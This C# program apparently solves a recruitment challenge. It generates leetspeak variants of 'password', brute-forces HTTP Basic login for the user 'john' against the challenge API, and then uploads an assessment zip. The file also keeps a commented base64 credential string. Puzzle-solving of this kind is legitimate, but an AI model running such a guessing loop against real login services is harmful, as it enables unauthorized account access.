using System.Net;
using System.Net.Http.Headers;
using System.Net.Http;
using System.Threading.Tasks;
using System;
using System.Reflection;
using System.IO;
using System.Text;
using System.Collections.Generic;
using Tries;
using Newtonsoft.Json;

namespace password_api_assessment
{
  class Program
  {
    static async Task Main(string[] args)
    {
      var layers = new List<string>() { "pP", "aA@", "sS5", "sS5", "wW", "oO0", "rR", "dD" };
      var trieLayer = new Trie();

      trieLayer.InsertLayers(layers);
      var path = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
      var fileName = "dict.txt";
      var file = $"{path}/{fileName}";
      trieLayer.OutputToFile(fileName, path);

      var passwords = File.ReadAllLines(file);
      Console.WriteLine($"Number Password: {passwords.Length}");
      await BruteForceAttack("john", passwords);
    }

    private static string EncodeBase64String(string text)
    {
      var textBytes = Encoding.UTF8.GetBytes(text);
      var text64 = Convert.ToBase64String(textBytes);
      return text64;
    }

    private static async Task BruteForceAttack(string username, string[] passwords)
    {
      var count = 1;
      foreach (var password in passwords)
      {
        Console.Write($"{count}. ");
        var userAuth = $"{username}:{password}";
        var basicEncoding = EncodeBase64String(userAuth);
        // basicEncoding = "am9objpQYTVTd09yRA==";
        var uploadUrl = await MakeRequests(basicEncoding);
        if (uploadUrl != "")
        {
          await UploadResults(uploadUrl, basicEncoding);
          break;
        }
        count++;
      }
      Console.WriteLine("Done");
    }

    private static async Task UploadResults(string url, string basicAuth)
    {
      var uploadUrl = url ?? "http://recruitment.warpdevelopment.co.za/api/upload/6123456789156";
      var client = new HttpClient();
      client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", basicAuth);
      var file = "./assessment.zip";

      if (File.Exists(file))
      {
        var assessmentFileBytes = File.ReadAllBytes(file);
        var assessmentFileBase64 = Convert.ToBase64String(assessmentFileBytes);
        var uploadJson = JsonConvert.SerializeObject(new { Data = assessmentFileBase64 });
        var data = new StringContent(uploadJson, Encoding.UTF8, "application/json");
        var response = await client.PostAsync(uploadUrl, data);
        string result = response.Content.ReadAsStringAsync().Result;
        Console.WriteLine($"Results: {result}");
      }

    }

    private static async Task<string> MakeRequests(string basicAuth)
    {
      var url = "http://recruitment.warpdevelopment.co.za/api/authenticate";

      var client = new HttpClient();
      client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", basicAuth);
      var results = await client.GetAsync(url);
      Console.WriteLine($"Request: {basicAuth} - Results: {results.StatusCode} - Request Header: {client.DefaultRequestHeaders}");
      if (HttpStatusCode.Unauthorized != results.StatusCode && HttpStatusCode.InternalServerError != results.StatusCode)
      {
        string result = results.Content.ReadAsStringAsync().Result;
        return result;
      }
      return "";
    }
  }
}
